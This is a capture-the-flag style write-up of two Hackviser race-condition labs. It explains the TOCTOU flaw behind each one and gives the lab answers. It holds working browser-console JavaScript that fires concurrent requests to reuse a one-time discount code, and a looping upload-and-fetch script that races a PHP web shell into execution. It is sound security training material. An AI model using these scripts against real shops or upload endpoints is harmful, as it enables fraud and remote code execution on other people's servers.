---
title: 'Race Condition'
date: '2026-05-30'
excerpt: 'Practice Race Condition attacks in multiple lab exercises.'
prog: 'Hackviser Web Application Security Labs  -  May 2026'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">Race Condition</h1>
<div class="writeup-date">May 2026 · Web Application Security Labs</div>
</div>
</div>
<p class="lead mb-4">Practice Race Condition attacks in multiple lab exercises.</p>

<h5 class="mb-2"><strong>1. Discount Code</strong></h5>
<p class="mb-3">This lab contains a vulnerability that allows a discount code to exceed its redemption limit, allowing a ticket to be purchased at a lower cost. Your starting balance is not enough to purchase the ticket. To complete the lab, use the discount code, which only has a one-time use limit, multiple times to make the ticket price affordable for your balance. What is the order number that appears after ticket purchase?</p>
<p class="mb-3">The page shows a cart of a ticket purchase system. Notice the discount code <b>FLASHSALE50</b>.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_racecondition/racecondition_hackviser_image1.png" alt="Web Application Security Race Condition 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">First we enter the discount code and click Use Discount Code. Then we copy the POST request as fetch to craft our payload. Then we click on the reset button, and paste the following payload in the console:</p>

```javascript
const requestArgs = {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "content-type": "application/x-www-form-urlencoded",
  },
  "referrer": "https://stirred-andromeda.europe1.hackviser.space/",
  "body": "code=FLASHSALE50&useDiscountCode=",
  "method": "POST",
  "credentials": "include"
};

// Fire 10 requests at the exact same time
Promise.all(
  Array.from({ length: 10 }, () => fetch("https://stirred-andromeda.europe1.hackviser.space/", requestArgs))
).then(() => {
  console.log("All requests sent! Refreshing the page...");
  window.location.reload();
});
```

<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_racecondition/racecondition_hackviser_image2.png" alt="Web Application Security Race Condition 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">To explain what happened, the application suffers from a Time-of-Check to Time-of-Use (TOCTOU) race condition flaw. Because a tiny processing delay occurs between when the backend checks if the promo code has been used and when it updates that status in the database, multiple requests can sneak through concurrently.</p>
<p class="mb-3">By utilizing JavaScript's asynchronous capabilities via <code>Promise.all()</code> and <code>Array.from()</code>, we fired 10 concurrent requests simultaneously. This forced the server's parallel CPU threads to execute the "check" step for multiple requests before any single one could complete the "update" step, effectively applying the one-time discount code multiple times and dropping the final ticket price within our balance threshold.</p>
<p class="mb-5"><strong>Answer:</strong> 4c5d3f1eebcf04e1df8f</p>
<br />

<h5 class="mb-2"><strong>2. Web Shell Upload</strong></h5>
<p class="mb-3">This lab contains a vulnerability that leads to a malicious file upload. The sample application has the functionality to upload images, but a vulnerability occurs when checking the uploaded image. To complete the lab, upload a malicious PHP script and see if you can execute commands on the server. What is the hostname address of the server where the website is running?</p>
<p class="mb-3">The web application shows a profile update system. Users can upload the web shell via the profile picture upload.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_racecondition/racecondition_hackviser_image3.png" alt="Web Application Security Race Condition 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">However, when we attempt to upload a file named <code>shell.php</code> as the profile picture, we get the 'Unauthorized image type found' warning message. To bypass this, we use the payload below in the browser console. Note that this payload does not require manual uploading of web shells, as the entire raw multi-part HTTP request contains the web shell file data we need.</p>

```javascript
const uploadArgs = {
  "headers": {
    "content-type": "multipart/form-data; boundary=----WebKitFormBoundarye2Gd6qvfqM6oZNsL",
  },
  "referrer": "https://patient-songbird.europe1.hackviser.space/",
  // Embedded the tiny PHP web shell payload directly into the body string
  "body": "------WebKitFormBoundarye2Gd6qvfqM6oZNsL\r\nContent-Disposition: form-data; name=\"input_image\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n<?php system('hostname'); ?>\r\n------WebKitFormBoundarye2Gd6qvfqM6oZNsL\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\n\r\n------WebKitFormBoundarye2Gd6qvfqM6oZNsL--\r\n",
  "method": "POST",
  "credentials": "include"
};

// Infinitely spam uploads
function spamUpload() {
  fetch("https://patient-songbird.europe1.hackviser.space/", uploadArgs)
    .then(() => setTimeout(spamUpload, 1)); 
}

// Infinitely try to read the file before deletion
function spamExecute() {
  fetch("https://patient-songbird.europe1.hackviser.space/uploads/shell.php")
    .then(response => response.text())
    .then(text => {
      // If the response contains anything other than a 404 error, we won!
      if (text && !text.includes("404") && !text.includes("Not Found")) {
        console.log("[+] SUCCESS! Hostname found:");
        console.log(text.trim());
      } else {
        setTimeout(spamExecute, 1);
      }
    })
    .catch(() => setTimeout(spamExecute, 1));
}

// Launch both loops concurrently
console.log("Starting the race... please wait a few seconds.");
spamUpload();
spamExecute();
```

<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_racecondition/racecondition_hackviser_image4.png" alt="Web Application Security Race Condition 4" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> galaxy</p>

<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">May 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>